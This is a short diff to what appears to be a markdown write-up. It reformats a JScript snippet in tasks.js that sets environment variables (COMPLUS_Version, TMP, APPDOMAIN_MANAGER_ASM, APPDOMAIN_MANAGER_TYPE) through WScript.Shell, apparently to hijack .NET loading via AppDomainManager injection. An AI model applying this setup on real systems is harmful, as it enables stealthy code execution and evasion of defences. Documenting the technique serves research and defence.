@@ -85,7 +85,8 @@ tasks.js
 
 ```
 // Controls the search path for unmanged dlls
-new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'c:\\Windows\\System32\\Tasks';
+new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
+new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'c:\\Windows\\System32\\Tasks';
 new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
 new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'MyAppDomainManager';
 
